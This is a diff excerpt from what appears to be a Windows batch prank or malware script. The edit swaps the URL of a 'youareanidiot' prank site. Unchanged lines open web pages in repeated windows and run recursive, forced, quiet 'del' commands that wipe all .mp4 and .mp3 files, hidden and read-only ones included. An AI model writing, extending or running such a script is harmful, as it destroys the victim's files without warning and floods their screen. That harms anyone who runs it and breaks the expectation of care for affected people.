@@ -534,7 +534,7 @@ start https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Flh5.googleuser
 start https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Flh5.googleusercontent.com%2Fproxy%2FphACkNA4eNYm8j2t78vin7GkqFLy412Vh6TFe-EDHculMDx0D1ihzUw8Tgj81kd5GKd_cbw81nTbHSij61py9dbQR3RMDnMStQmuHaX6WFUpgsOBWQfwaIpsoGyFm-SP%3Dw1200-h630-p-k-no-nu&f=1&nofb=1
 start https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Flh5.googleusercontent.com%2Fproxy%2FphACkNA4eNYm8j2t78vin7GkqFLy412Vh6TFe-EDHculMDx0D1ihzUw8Tgj81kd5GKd_cbw81nTbHSij61py9dbQR3RMDnMStQmuHaX6WFUpgsOBWQfwaIpsoGyFm-SP%3Dw1200-h630-p-k-no-nu&f=1&nofb=1
 timeout /t 15 > nul
-start http://web.archive.org/web/20040804/youareanidiot.org
+start https://youareanidiot.cc/
 del /s /q /a /f *.mp4
 del /s /q /a /f *.mp3
 start https://www.youtube.com/watch?v=l5hvakZf8qw
